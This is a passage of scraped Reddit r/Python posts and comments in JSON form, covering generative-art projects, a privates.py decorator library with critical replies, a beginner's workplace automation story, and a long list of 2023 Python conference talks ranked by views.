            "score": "5",
            "content": "Do you not have a screen recorder? Nice work btw!"
        },
        {
            "author": "RedditGood123",
            "score": "8",
            "content": "Turtle module?"
        },
        {
            "author": "MyHomeworkAteMyDog",
            "score": "3",
            "content": "Cool"
        },
        {
            "author": "MedicatedDeveloper",
            "score": "3",
            "content": "Bezier curves rock! One thing I never developed but always thought about was 3d Bezier curves through a color space such as HSL or LAB to create interesting color transitions that aren't too jarring."
        },
        {
            "author": "Louisdj",
            "score": "5",
            "content": "So satisfying to watch ! We, sir, need this GitHub repo !"
        },
        {
            "author": "mfb1274",
            "score": "2",
            "content": "Looks like the bridges I make in bridge constructor.."
        }
    ]
},
{
    "post_author": "thebuffed",
    "post_id": "eqir9x",
    "post_score": "1831",
    "post_time": "Saturday, January 18, 2020 at 7:50:46 PM GMT+3",
    "flair_text": "",
    "post_title": "Generating Geometric Birds",
    "media": [
        "https://i.redd.it/knqxkwn4hkb41.png",
        "https://preview.redd.it/knqxkwn4hkb41.png?width=640&crop=smart&auto=webp&s=7c7fcbb0e5bcaad6bf466c528eac9ab9c012c449"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "thebuffed",
            "score": "80",
            "content": "Trying to replicate the style of these designs, but in a generative way. Work in progress, but pretty happy so far Source code: https://github.com/erdavids/Birds-of-a-Feather More projects: https://github.com/erdavids/Generative-Art"
        },
        {
            "author": "Tweak_Imp",
            "score": "39",
            "content": "Now create pythons!"
        },
        {
            "author": "eldoea",
            "score": "18",
            "content": "Very cool. Thanks for sharing!"
        },
        {
            "author": "Sirmikon",
            "score": "15",
            "content": "Cool. I love stuff like this! Nice job! (Chernoff Faces immediately spring to mind as an orthinological application for this! Basically, instead of pure random generation, link different bird features with data from a real dataset. You could model birds’ sizes based on weight, feather color based on habitat, eye size based on intelligence, talon type based on diet, etc... It would be really cool to see how the algorithm would draw different birds."
        },
        {
            "author": "mountains-o-data",
            "score": "6",
            "content": "What a fun project! I love this"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "At least 150 or more to see. To be a geometric bird master is my destiny!"
        },
        {
            "author": "gibran800",
            "score": "6",
            "content": "This is really, really amazing! Just one question, I was looking at the source code and I noticed that your file has a .pyde extension. What's the difference between that and the regular .py? Thanks!"
        },
        {
            "author": "Verslizzle",
            "score": "3",
            "content": "Nice work. How did you come up with this idea and where do you plan on taking it?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Procedurally generated memes are the future"
        }
    ]
},
{
    "post_author": "ZeroIntensity",
    "post_id": "1c48ww9",
    "post_score": "0",
    "post_time": "Monday, April 15, 2024 at 3:34:38 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "privates.py - Stop others from touching your privates!",
    "media": [
        "https://github.com/ZeroIntensity/privates.py"
    ],
    "post_content": "Quick example:\nfrom privates import private\n\n@private\nclass Hello:\n    __readonly__ = \"bar\",  # No need for @property!\n    __protected__ = \"foo\",\n\n    def __init__(self):\n        self.bar = \"hello world!\"\n        self.foo = \"foo\"\n\n# Hello is now only usable from this module\nRepo: https://github.com/ZeroIntensity/privates.py",
    "comments": [
        {
            "author": "bliepp",
            "score": "145",
            "content": "I mean, you replace a decorator with another decorator to save like 2 lines of code while trading explicit code for equally readable implicit code. Basically this has no benefit at all while introducing additional dependencies, slowing down attribute access, breaking expected behaviour and moving away from the zen of Python. Also, there's no need to enforce private read-only variables. Seems like a very bad idea. TL;DR This ain't JavaScript, son.",
            "replies": [
                {
                    "author": "arjjov",
                    "score": "10",
                    "content": "This 💯"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "I've worked professionally in Java for like 7 years and have never even considered doing this...",
                    "replies": [
                        {
                            "author": "ProgrammersAreSexy",
                            "score": "4",
                            "content": "I've worked professionally in Java for like 7 years and have never even considered doing this..."
                        }
                    ]
                },
                {
                    "author": "Heavy-Appearance-824",
                    "score": "-11",
                    "content": "",
                    "replies": [
                        {
                            "author": "dAnjou",
                            "score": "7",
                            "content": "Just because you can doesn't mean you should. \"There should be one (and preferably only one) obvious way to do it.\" https://zen.danjou.dev/13/ And are we really supposed to implicitly assume OP's intentions by stalking their Reddit history? \"Explicit is better than implicit.\" https://zen.danjou.dev/2/"
                        }
                    ]
                }
            ]
        },
        {
            "author": "metaphorm",
            "score": "20",
            "content": "but why?"
        },
        {
            "author": "solomonxie",
            "score": "23",
            "content": "Usually it’s just same developer, basically he’s making trouble for himself to touch his own privates",
            "replies": [
                {
                    "author": "rocket_randall",
                    "score": "2",
                    "content": "That's why I like C++"
                }
            ]
        },
        {
            "author": "LinearArray",
            "score": "7",
            "content": "Why should I use it over @property?"
        },
        {
            "author": "go_fireworks",
            "score": "10",
            "content": "How is this better than using @property?",
            "replies": [
                {
                    "author": "mon_key_house",
                    "score": "2",
                    "content": "You can't have a @property class, can you? Other than that I couldn't find out what the sense is when reading the documentation."
                }
            ]
        },
        {
            "author": "_ologies",
            "score": "2",
            "content": "If you want it to be hidden, just call it __bar and you can't access Hello.__bar from outside the instance. Then if you want to make it read only you can call it that and have an @property called bar that you can access at Hello.bar that actually returns the double underscore one."
        },
        {
            "author": "Rawing7",
            "score": "1",
            "content": "I don't like the semantics of this implementation. Code like this @private class Hello: gives the impression that the class is private, even though that's not at all what that decorator does. I'd much prefer something like @readonly_attributes('bar') class Hello:"
        },
        {
            "author": "deus-exmachina",
            "score": "-3",
            "content": "Can you stop doing this stuff pls",
            "replies": [
                {
                    "author": "texasram",
                    "score": "-7",
                    "content": ""
                },
                {
                    "author": "askur_andrio",
                    "score": "-20",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "dirtycimments",
    "post_id": "l1ynlz",
    "post_score": "1829",
    "post_time": "Thursday, January 21, 2021 at 4:41:28 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Be an absolute beginner at python: Check, have co-workers think I'm performing black magic : Check",
    "media": [],
    "post_content": "I work in an industry that is mainly manual work (think carpentry or similar). No-one going through the trade school learns anything on computers beyond making graphs in excel.\nI however always have had some interest in programming, so i took some free course a while back and try to find areas of my life where i can automate the boring stuff. I have very limited knowledge of any of the advanced functions, but i understand some of the basic logic.\nFor my job, i also have a computer because i oversee a large number of projects, every project gets a folder, an excel spreadsheet (a gantt chart for each project).\nI managed to make a script that asks for project number, checks of the folder is there, copies and modifies the cells of the excel sheet to the correct project number etc. I had to google almost everything, how do i folder scan? how do i manipulate excel? etc etc.\nThey actually believe I performed black magic.\nThank you Python for letting me look like an invaluable resource today ;)\n[EDIT] thanks for all the awards! Happy my post inspired the discussion and the feeelz. Much love 💕",
    "comments": [
        {
            "author": "expressly_ephemeral",
            "score": "718",
            "content": "I had to google almost everything, how do i folder scan? how do i manipulate excel? etc etc. FYI, I'm a professional programmer with decades of experience. Wrote my first line of code in 9th grade to automate my math homework. Started getting paid to program in about 2002. Started picking up Python a few years ago. I also have to google almost everything."
        },
        {
            "author": "Dawnero",
            "score": "143",
            "content": "automate the boring stuff He said the line!"
        },
        {
            "author": "mysticalfruit",
            "score": "262",
            "content": "This. To me it's just programming.. I'm just giving the computer very detailed instructions. I love that look on peoples faces like you just rubbed the lamp amd got a wish granted."
        },
        {
            "author": "Myllokunmingia",
            "score": "56",
            "content": "After my freshman year I couldn't get a good technical internship, so I ended up with a data entry job. My manger there was a classic boomer and all \"harr harr you'll never be able to keep up with the amount of work, etc. etc.\". I didn't do a single entry for the first 2 weeks. I just learned to write Python and figured out how to automate every case for data entry I had. By that point I was done and I was able to run a script to do my entire summer's workload in under 5 minutes. My boss was pretty tech illiterate (think: unable to differentiate between email and text, several times had to have me help him open internet explorer because the computer \"lost\" it (he kept deleting the desktop shortcut somehow)) and I asked him what he thought about automating my work. He got very defensive and claimed \"you can't trust computers they make mistakes only humans doing the work can be 100% certain\" (as if humans don't constantly make mistakes...). So I gave him the first 2 weeks of data. The rest of the summer I'd run my script on a Monday, be done with 2 weeks of work in 30 seconds, and just browse reddit, watch videos, bullshit with coworkers. Then I'd turn in my completed work 2 weeks later. He was constantly blown away I was able to finish all the work and that it contained no errors. He thought I was some sort of numbers savant. Come the end of the summer they had no more work scheduled to give me so he gave me access to a huge backlog they had, and asked me to just do as much as I could before I left for school. I ran my script on it and turned in the entirety of their backlog a couple hours later. I also emailed him the script and a very detailed word document on how to use it. He was absolutely livid. Honestly I've never been scared in a workplace like that before, I thought he was going to rip my head off. Screaming, accusations, the works. He claimed he was going to sue me for wage theft because now he would have to go back and redo all of my work because he couldn't trust the script. Of course that never happened but I was told not to come back for my last week. Some people are so stuck in the past it's truly amazing. Also I've been programming for almost a decade and writing software professionally for over 5 years and I still have to google how to open a file in python."
        },
        {
            "author": "qckpckt",
            "score": "17",
            "content": "I had to google almost everything I'm an intermediate developer with about 3 years experience at a tech company and I have to google _absolutely_ everything. I hope to one day reach the almost everything stage."
        },
        {
            "author": "PaulSandwich",
            "score": "17",
            "content": "Not sure what your appetite for it is, but this is exactly how I went from 10yrs in operations to Jr Operations Analyst. now I'm a Data Engineer making nearly triple what I was back on the floor. They actually believe I performed black magic. Magicians get paid; keep practicing the dark arts."
        },
        {
            "author": "raipopenna",
            "score": "12",
            "content": "you can get a lot done just knowing the basics. 80/20 rule, especially when you are working in an environment with lots of non-programmers"
        },
        {
            "author": "[deleted]",
            "score": "23",
            "content": "This is the best feeling like I used python to turn and off the lights in the house and my parents got so scared"
        },
        {
            "author": "mrprofessor007",
            "score": "9",
            "content": "So happy for you. Mainly because you genuinely solved a problem by learning a skill."
        },
        {
            "author": "anthro28",
            "score": "8",
            "content": "I once worked a tech project that was led by an accountant. Anything we did was voodoo. It was a good feeling to have 5 goofball college kids in a room together cranking shit out and confusing management as to how work could get done without oversight."
        }
    ]
},
{
    "post_author": "TechTalksWeekly",
    "post_id": "1c0jpyj",
    "post_score": "19",
    "post_time": "Wednesday, April 10, 2024 at 2:54:31 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "All Python conference talks from 2023 ordered by the number of views",
    "media": [
        "https://youtube.com/watch?v=n0xe7nHd3QA",
        "https://youtube.com/watch?v=rB7c69Z5Kus",
        "https://youtube.com/watch?v=Y5XQR0wUEyM",
        "https://youtube.com/watch?v=CG3b6D3XNOE",
        "https://youtube.com/watch?v=gXiXBZpM9Zw",
        "https://youtube.com/watch?v=wISl6LCL8XY",
        "https://youtube.com/watch?v=NYBWN6B-h0Y",
        "https://youtube.com/watch?v=Bj1U-Rrxk48",
        "https://youtube.com/watch?v=UOdMnlQRRCk",
        "https://youtube.com/watch?v=AMq8qZZwlYc",
        "https://youtube.com/watch?v=VtL6Y4x10O0",
        "https://youtube.com/watch?v=wyty6sFMWI0",
        "https://techtalksweekly.substack.com/p/tech-conferences",
        "https://youtube.com/watch?v=ysRuJ5BJeFs",
        "https://youtube.com/watch?v=CJ0f45evuME",
        "https://youtube.com/watch?v=Fcp1eQCeD6U",
        "https://youtube.com/watch?v=Oho53bvl4rg",
        "https://youtube.com/watch?v=QtG858LRQI0",
        "https://youtube.com/watch?v=rGgqP0othsM",
        "https://youtube.com/watch?v=eMGF9AeO-sM",
        "https://youtube.com/watch?v=zvS1Uj3_UTE",
        "https://youtube.com/watch?v=JA7fXekmT_Q",
        "https://youtube.com/watch?v=IX3300umebg",
        "https://youtube.com/watch?v=yDYiiVVkBXY",
        "https://youtube.com/watch?v=ZjjgMiCU8s4",
        "https://youtube.com/watch?v=0ovCLxttJGE",
        "https://youtube.com/watch?v=uswpei2GpLE",
        "https://youtube.com/watch?v=C0_bh_5C5ro",
        "https://youtube.com/watch?v=rUVTb6goWUs",
        "https://youtube.com/watch?v=2i2nyodhGkk",
        "https://docs.google.com/spreadsheets/d/14zNPyGNMDt7ejEHM6c8WpK4hfbmPJmbP1e4N3vM87A8/edit#gid=1618238783",
        "https://youtube.com/watch?v=pIRWBPSkw6I",
        "https://youtube.com/watch?v=YxexVsMTYT8",
        "https://youtube.com/watch?v=QJ4Z9KpdjIo",
        "https://youtube.com/watch?v=tHLOtZNsCBc",
        "https://youtube.com/watch?v=KNeHNEs_I3k",
        "https://youtube.com/watch?v=-MYYB0QjV6I",
        "https://youtube.com/watch?v=VedepVXiql4",
        "https://youtube.com/watch?v=qCw0ySOeekA",
        "https://youtube.com/watch?v=Glbwb5Hxu18",
        "https://youtube.com/watch?v=dI_-shCf72M",
        "https://youtube.com/watch?v=urBrxQ4e8WY",
        "https://youtube.com/watch?v=oVhJAVS3g00",
        "https://youtube.com/watch?v=hXYFS2pOEH8",
        "https://youtube.com/watch?v=CtkMzCIXOWk",
        "https://youtube.com/watch?v=uI6T0y4Vbyc",
        "https://youtube.com/watch?v=RvUp7M-3qXM",
        "https://youtube.com/watch?v=qMv1ZD2V1A4",
        "https://youtube.com/watch?v=5f4o3nyAz5w",
        "https://youtube.com/watch?v=a77soe8oFVI",
        "https://youtube.com/watch?v=fYXAbfHZmRg",
        "https://youtube.com/watch?v=shQtrn1v7sQ",
        "https://youtube.com/watch?v=RVmltK006CU",
        "https://youtube.com/watch?v=BBQPeLYpdLY",
        "https://youtube.com/watch?v=Wf80CSqWSiQ",
        "https://youtube.com/watch?v=RwMUyf9qz-I",
        "https://youtube.com/watch?v=fckyXntHy1s",
        "https://www.reddit.com/r/Python/comments/196b3ak/15_most_watched_talks_from_pycon_2023_us_and_au/",
        "https://youtube.com/watch?v=YwYIDpze52s",
        "https://youtube.com/watch?v=HTb0FcKtkCc",
        "https://youtube.com/watch?v=vXQ6B2XwQ2g",
        "https://youtube.com/watch?v=zvtztKcoUR4",
        "https://youtube.com/watch?v=PH4wvi_co1M",
        "https://youtube.com/watch?v=icpHrbDlGaw",
        "https://youtube.com/watch?v=sepiszMSvBs",
        "https://youtube.com/watch?v=7xcUvzERwx0",
        "https://youtube.com/watch?v=WYlC8jE8itI",
        "https://youtube.com/watch?v=fNv45zvs9pU",
        "https://youtube.com/watch?v=k8MT5liCQ7g",
        "https://youtube.com/watch?v=SJpM7S0rKiE",
        "https://youtube.com/watch?v=uHksXhxAZpU",
        "https://youtube.com/watch?v=ksVED-hacKA",
        "https://youtube.com/watch?v=pGGjS6CkDeE",
        "https://youtube.com/watch?v=k-G_5--ytsE",
        "https://youtube.com/watch?v=G3EY2IHG1xA",
        "https://youtube.com/watch?v=vy8VrhaYR2M",
        "https://youtube.com/watch?v=7jtzjovKQ8A",
        "https://youtube.com/watch?v=Y7WMav9fmUo",
        "https://youtube.com/watch?v=AsTAAq5jKSo",
        "https://youtube.com/watch?v=MsJjzVIVs6M",
        "https://youtube.com/watch?v=spCOYV4KyPA",
        "https://youtube.com/watch?v=BDbGLGCVOKo",
        "https://youtube.com/watch?v=UwRlFtSd_-8",
        "https://youtube.com/watch?v=vICrdSUS9vg",
        "https://youtube.com/watch?v=ZNlp5J0e9H4",
        "https://techtalksweekly.substack.com/p/ttw-extra-4-all-python-conference",
        "https://youtube.com/watch?v=gl9mNdEfd_U",
        "https://youtube.com/watch?v=dgBFShBuV4k",
        "https://youtube.com/watch?v=pWZw7hYoRVU",
        "https://youtube.com/watch?v=tjSRcxDV-5c",
        "https://youtube.com/watch?v=SLsaCdRAV0U",
        "https://youtube.com/watch?v=np_YsjQAcEw",
        "https://youtube.com/watch?v=Mh5mS6FasUg",
        "https://youtube.com/watch?v=MuK6lmsfX1E",
        "https://youtube.com/watch?v=qcP5wNvV1uk",
        "https://youtube.com/watch?v=emJyPeoHDjU",
        "https://youtube.com/watch?v=sD-KmuqqYPY",
        "https://youtube.com/watch?v=zi9KgTJjnjc",
        "https://youtube.com/watch?v=u4U_PUTasPQ",
        "https://youtube.com/watch?v=A8bvJlG6phk",
        "https://youtube.com/watch?v=3ywZjnjeAO4",
        "https://youtube.com/watch?v=UbPuen-rlDk",
        "https://youtube.com/watch?v=v8o-7UICRNk",
        "https://youtube.com/watch?v=3-drZY3u5vo",
        "https://youtube.com/watch?v=a94qqU6rpyE",
        "https://youtube.com/watch?v=cw44529_OU8",
        "https://youtube.com/watch?v=7Ob2dbvH-Po",
        "https://youtube.com/watch?v=3HCAScFqr10",
        "https://youtube.com/watch?v=7QQZ1hrHG1s",
        "https://youtube.com/watch?v=RY-M0tvN77s",
        "https://youtube.com/watch?v=vZmoEa7oWMg",
        "https://www.reddit.com/r/python/",
        "https://youtube.com/watch?v=ol6IQUbyeDo",
        "https://youtube.com/watch?v=M2hoEYXkBa8",
        "https://youtube.com/watch?v=R6lPb9Meqoc",
        "https://youtube.com/watch?v=yp6WuHFhYCo",
        "https://youtube.com/watch?v=6gjvjkSs570",
        "https://youtube.com/watch?v=Qp3XZeB15lA",
        "https://youtube.com/watch?v=FjaAhF_Iwls",
        "https://youtube.com/watch?v=JGINjfmbXIM",
        "https://youtube.com/watch?v=T0rzH_KslKQ",
        "https://youtube.com/watch?v=QwbCQhLSXxk",
        "https://youtube.com/watch?v=RVUi_rAFfzU",
        "https://youtube.com/watch?v=n5QaOADqSyY",
        "https://youtube.com/watch?v=-eR2YKRBYuY",
        "https://youtube.com/watch?v=q_SKaOeRiOI",
        "https://youtube.com/watch?v=iKzOBWOHGFE",
        "https://youtube.com/watch?v=2qpW1-7TnzA",
        "https://youtube.com/watch?v=vTd3OqDzjuo",
        "https://youtube.com/watch?v=aLe00cCLYwA",
        "https://youtube.com/watch?v=r8dWZX8IGw8",
        "https://youtube.com/watch?v=FNCF6PX0dbk",
        "https://youtube.com/watch?v=NWJ5LoV58Ps",
        "https://youtube.com/watch?v=NcO2v6DDH10",
        "https://youtube.com/watch?v=eZwHvBsoPn4",
        "https://youtube.com/watch?v=2Ul6WlKPcgY",
        "https://youtube.com/watch?v=cwE1CGb6DyA",
        "https://youtube.com/watch?v=AtgjdK2Gglg",
        "https://youtube.com/watch?v=ZuN05nCmYqo",
        "https://youtube.com/watch?v=0mDgjZMcW04",
        "https://youtube.com/watch?v=Vqd964LGcI4",
        "https://youtube.com/watch?v=QGUvjcrqj-U",
        "https://youtube.com/watch?v=MF3ZNET89F0",
        "https://youtube.com/watch?v=wHpphKNegSI",
        "https://youtube.com/watch?v=-249nmQfv1U",
        "https://youtube.com/watch?v=5TdIxxBPUSI",
        "https://youtube.com/watch?v=YUoflPpVLjQ",
        "https://youtube.com/watch?v=8bc0WJENcSY",
        "https://youtube.com/watch?v=--WcrDRtrYk",
        "https://youtube.com/watch?v=bRcKiLA2yBQ",
        "https://youtube.com/watch?v=x2ADMZfBqa4",
        "https://youtube.com/watch?v=olXire09ZnE",
        "https://youtube.com/watch?v=52n2qKgwW_Q",
        "https://youtube.com/watch?v=nTgKbiWg-YY",
        "https://youtube.com/watch?v=knUGpULAmn4"
    ],
    "post_content": "Hello r/python 👋! Back in January, I've compiled a list of the most watched PyCon talks from 2023. I've received tons of positive feedback via DM, upvotes, and comments, so I decided to put together another compilation.\nThis time around, I've gathered not only PyCon, but all Python 2023 talks across +100 conferences (here's the list) that include PyCon (all locations), PyData (all locations), EuroPython, Conf42, and many more to give you a complete overview of the landscape. The list is gigantic and includes over 850 talks**!**\nWhat's more, I've created a Google Sheets version of this post that gives more convenient sorting and filtering options.\nIf it turns to be useful, don't forget to share the list with friends / colleagues!\n\"Tutorials - Mario Munoz: Web Development With A Python-backed Frontend: Featuring HTMX and Tailwind\" ⸱ +12k views ⸱ 02h 26m 00s\n\"Thomas Bierhance: Polars - make the switch to lightning-fast dataframes\" ⸱ +11k views ⸱ 00h 29m 49s\n\"Mariatta Wijaya: Welcome to PyCon US 2023\" ⸱ +11k views ⸱ 00h 29m 29s\n\"Scaling Python for Machine Learning: Beyond Data Parallelism • Holden Karau • GOTO 2023\" ⸱ +10k views ⸱ 00h 39m 19s\n\"Tutorials - Matt Harrison: Getting Started with Polars\" ⸱ +10k views ⸱ 02h 14m 28s\n\"Keynote Speaker - Ned Batchelder\" ⸱ +7k views ⸱ 00h 47m 02s\n\"Gábor Szárnyas - DuckDB: The Power of a Data Warehouse in your Python Process\" ⸱ +7k views ⸱ 00h 55m 27s\n\"Talks - Samuel Colvin: How Pydantic V2 leverages Rust's Superpowers\" ⸱ +6k views ⸱ 00h 45m 55s\n\"Delta-rs, Apache Arrow, Polars, WASM: Is Rust the Future of Analytics?\" ⸱ +6k views ⸱ 00h 31m 03s\n\"Tutorials - Simon Willison: Data analysis with SQLite and Python\" ⸱ +5k views ⸱ 02h 45m 54s\n\"Talks - Hynek Schlawack: Subclassing, Composition, Python, and You\" ⸱ +5k views ⸱ 00h 45m 42s\n\"Writing Python Bindings for C++ Libraries: Easy-to-use Performance - Saksham Sharma - CppCon 2023\" ⸱ +5k views ⸱ 01h 01m 30s\n\"Pedro Holanda - DuckDB: Bringing analytical SQL directly to your Python shell\" ⸱ +5k views ⸱ 00h 29m 31s\n\"Tutorials - Lisa Carpenter: How to create beautiful interactive GUIs and web apps\" ⸱ +5k views ⸱ 01h 58m 05s\n\"Tutorials - Reuven M. Lerner: Comprehending comprehensions\" ⸱ +5k views ⸱ 02h 17m 33s\n\"Keynote Speaker - Guido van Rossum\" ⸱ +5k views ⸱ 00h 30m 51s\n\"PyData Heidelberg #11 - TimeSeries Forecasting & LLM Langchain\" ⸱ +4k views ⸱ 02h 39m 06s\n\"Keynote Speaker - James Powell\" ⸱ +4k views ⸱ 00h 25m 43s\n\"Use Spark from anywhere: A Spark client in Python powered by Spark Connect\" ⸱ +4k views ⸱ 00h 56m 58s\n\"Cython 3 – Python at the speed of C — Stefan Behnel\" ⸱ +4k views ⸱ 00h 31m 15s\n\"Patrick Blöbaum: Performing Root Cause Analysis with DoWhy, a Causal Machine-Learning Library\" ⸱ +4k views ⸱ 00h 44m 38s\n\"Max Mergenthaler and Fede Garza - Quantifying Uncertainty in Time Series Forecasting\" ⸱ +4k views ⸱ 00h 37m 25s\n\"Talks - Bruce Eckel: Rethinking Objects\" ⸱ +4k views ⸱ 00h 32m 06s\n\"Rust for Python data engineers — Karim Jedda\" ⸱ +4k views ⸱ 00h 27m 30s\n\"Matt Harrison - An Introduction to Pandas 2, Polars, and DuckDB | PyData Global 2023\" ⸱ +4k views ⸱ 01h 22m 15s\n\"Tutorials - Ted Patrick: Writing Serverless Python Web Apps with PyScript\" ⸱ +3k views ⸱ 02h 55m 29s\n\"Tutorials - Trey Hunner: Intro to Python for Brand New Programmers\" ⸱ +3k views ⸱ 02h 16m 41s\n\"Dr. Thomas Wiecki: Bayesian Marketing Science - Solving Marketing's 3 Biggest Problems\" ⸱ +3k views ⸱ 00h 30m 35s\n[**\"Gaël Varoquaux: Prepping Tables for Machine Learning Gets Easier PyData Südwest]\"** ⸱ +3k views ⸱ 00h 57m 54s\n\"Talks - Reuven M. Lerner: Generators, coroutines and nanoservices\" ⸱ +3k views ⸱ 00h 26m 28s\n\"Talks - Brett Cannon: Python's syntactic sugar\" ⸱ +3k views ⸱ 00h 31m 11s\n\"Bruno Vollmer: BLE and Python - How to build a simple BLE project on Linux with Python\" ⸱ +3k views ⸱ 00h 29m 40s\n\"Vasileios Mourtakos - A data engineering framework in Python\" ⸱ +3k views ⸱ 00h 35m 55s\n\"Talks - Eric Snow: A Per-Interpreter GIL: Concurrency and Parallelism with Subinterpreters\" ⸱ +3k views ⸱ 00h 30m 29s\n\"Talks - Łukasz Langa: Working Around the GIL with asyncio\" ⸱ +2k views ⸱ 00h 44m 26s\n\"Hajime Takeda - Media Mix Modeling:How to Measure the Effectiveness of Advertising\" ⸱ +2k views ⸱ 00h 30m 37s\n\"Tutorials - Mike Müller: The How and Why of Object-oriented Programming in Python\" ⸱ +2k views ⸱ 02h 45m 34s\n\"Shahriyar Rzayev: Building Hexagonal Python Services\" ⸱ +2k views ⸱ 01h 29m 50s\n\"Performance tips by the FastAPI Expert — Marcelo Trylesinski\" ⸱ +2k views ⸱ 00h 24m 59s\n\"Solving Multi-Objective Constrained Optimisation Problems using Pymoo — Pranjal Biyani\" ⸱ +2k views ⸱ 00h 44m 23s\n\"Carsten Binnig: Towards Learned Database Systems\" ⸱ +2k views ⸱ 00h 43m 34s\n\"Talks - Brandt Bucher: Inside CPython 3.11's new specializing, adaptive interpreter\" ⸱ +2k views ⸱ 00h 23m 01s\n\"Carl Kadie - A Perfect, Infinite-Precision, Game Physics in Python | PyData Seattle 2023\" ⸱ +2k views ⸱ 00h 36m 26s\n\"From crontab to celery with no regrets by Marco Pavanelli\" ⸱ +2k views ⸱ 00h 32m 03s\n\"Talks - Al Sweigart: An Overview of the Python Code Tool Landscape 2023\" ⸱ +2k views ⸱ 00h 26m 58s\n\"Reinventing Machine Learning with Transformers and Hugging Face by Keynote speaker Julien Simon\" ⸱ +2k views ⸱ 01h 08m 52s\n\"Empower your Spring Applications with Python Features on GraalVM by Johannes Link @ Spring I/O 2023\" ⸱ +2k views ⸱ 00h 53m 00s\n\"Marysia Winkels - Data Storytelling through Visualization\" ⸱ +2k views ⸱ 00h 30m 57s\n\"What polars does for you — Ritchie Vink\" ⸱ +2k views ⸱ 00h 27m 45s\n\"Beyond Toy Datasets: Timeseries Forecasting for Real Business Problems - Robert Haase\" ⸱ +2k views ⸱ 00h 33m 55s\n\"PyData Online - An AI assistant for football analytics - Petar Veličković (Google DeepMind)\" ⸱ +2k views ⸱ 01h 02m 40s\n\"Talks - Mark Shannon: How we are making CPython faster. Past, present and future.\" ⸱ +2k views ⸱ 00h 29m 11s\n\"JIm Dowling - Build a production ML system with only Python on free serverless services\" ⸱ +2k views ⸱ 01h 22m 35s\n\"Writing a Python interpreter from scratch, in half an hour — Tushar Sadhwani\" ⸱ +2k views ⸱ 00h 43m 38s\n\"Dominika Basaj & Barbara Rychalska - Creating behavioral profiles of your customer\" ⸱ +2k views ⸱ 00h 26m 55s\n\"Stephan Sahm: Accelerate Python with Julia\" ⸱ +2k views ⸱ 01h 27m 14s\n\"Why Delta Lake is the Best Storage Format for Pandas Analyses\" ⸱ +2k views ⸱ 00h 28m 25s\n\"Tutorials - Geir Arne Hjelle: Introduction to Decorators: Power Up Your Python Code\" ⸱ +2k views ⸱ 02h 21m 20s\n\"Jeroen Overschie - How to create a Devcontainer for your Python project 🐳\" ⸱ +2k views ⸱ 00h 36m 01s\n\"Wesley Boelrijk - Lowering the barrier for ML monitoring\" ⸱ +2k views ⸱ 00h 36m 53s\n\"Talks - Dan Craig: Testing Spacecraft with Pytest\" ⸱ +2k views ⸱ 00h 30m 12s\n\"Keynote Speaker - Margaret Mitchell\" ⸱ +2k views ⸱ 00h 42m 29s\n\"Talks - Moshe Zadka: pyproject.toml, packaging, and you\" ⸱ +2k views ⸱ 00h 30m 06s\n\"Tutorials - Juhi, Dana: Intro to Hugging Face: Fine-tuning BERT for NLP tasks\" ⸱ +2k views ⸱ 02h 09m 52s\n\"Tutorials - Patrick Arminio: Build a production ready GraphQL API using Python\" ⸱ +2k views ⸱ 02h 23m 14s\n\"Ryan Curtin - Lightweight, low-overhead, high-performance: machine learning directly in C++\" ⸱ +2k views ⸱ 00h 43m 10s\n\"Python with Spark Connect\" ⸱ +2k views ⸱ 00h 33m 27s\n\"David Qiu - Jupyter AI — Bringing Generative AI to Jupyter | PyData Seattle 2023\" ⸱ +1k views ⸱ 00h 39m 29s\n\"Polars: A highly optimized dataframe library | Matt Harrison | Conf42 Machine Learning 2023\" ⸱ +1k views ⸱ 00h 20m 31s\n\"Nico Kreiling: Raised by Pandas, striving for more: An opinionated introduction to Polars\" ⸱ +1k views ⸱ 00h 29m 47s\n\"Jiang et al. - Automated Machine Learning & Tuning with FLAML | PyData Seattle 2023\" ⸱ +1k views ⸱ 01h 21m 54s\n\"Alexander CS Hendorf: 5 Things about fastAPI I wish we had known beforehand\" ⸱ +1k views ⸱ 00h 32m 31s\n\"Duarte Carmo - MLOps for the rest of us- A poor man's guide to putting models in production\" ⸱ +1k views ⸱ 00h 26m 04s\n[**\"Ines Montani (spaCy) - Large Language Models from Prototype to Production PyData Südwest]\"** ⸱ +1k views ⸱ 00h 39m 55s\n\"Robin Raymond: Rusty Python - A Case Study\" ⸱ +1k views ⸱ 00h 28m 47s\n\"Tutorials - Leah Berg, Ray: Feature Engineering is for Everyone!\" ⸱ +1k views ⸱ 02h 16m 35s\n\"Giles Weaver & Ian Ozsvald - Pandas 2, Dask or Polars? Tackling larger data on a single machine\" ⸱ +1k views ⸱ 00h 16m 22s\n\"Talks - Glyph: How To Keep A Secret\" ⸱ +1k views ⸱ 00h 26m 19s\n\"Maximilian M. - SHAPtivating Insights: unravelling blackbox AI models\" ⸱ +1k views ⸱ 00h 35m 02s\n\"Vahan Huroyan - Recent Developments in Self-Supervised Learning for Computer Vision\" ⸱ +1k views ⸱ 00h 36m 25s\n\"Lucas Durand - Building an Interactive Network Graph to Understand Communities | PyData Seattle 2023\" ⸱ +1k views ⸱ 01h 26m 14s\n\"Big PyData BBQ #5: LLMs feat. Ines Montani (spaCy) & Alejandro Saucedo (Zalando)\" ⸱ +1k views ⸱ 03h 48m 21s\n\"Stop using print! Understanding and using the \"logging\" module — Reuven M. Lerner\" ⸱ +1k views ⸱ 00h 29m 32s\n\"Joris Van den Bossche & Patrick Hoefler: Pandas 2.0 and beyond\" ⸱ +1k views ⸱ 00h 37m 07s\n\"Structured output with large language models / Uri Goren (Argmax)\" ⸱ +1k views ⸱ 00h 25m 09s\n\"PyData Chicago April 2023 Meetup | Design and Analysis of (Backtest) Experiments with R and Python\" ⸱ +1k views ⸱ 00h 50m 19s\n\"Sponsor Presentation - Python & Bloomberg: An Open Source Duo\" ⸱ +1k views ⸱ 00h 57m 08s\n\"Soumith Chintala - Keynote: AI & the stuff built for AI - are they actually useful for data science?\" ⸱ +1k views ⸱ 00h 31m 54s\n\"The Future of Microprocessors — Sophie Wilson\" ⸱ +1k views ⸱ 00h 56m 45s\n\"Jia Yu - How Apache Sedona is Revolutionizing Geospatial Data Analysis | PyData Seattle 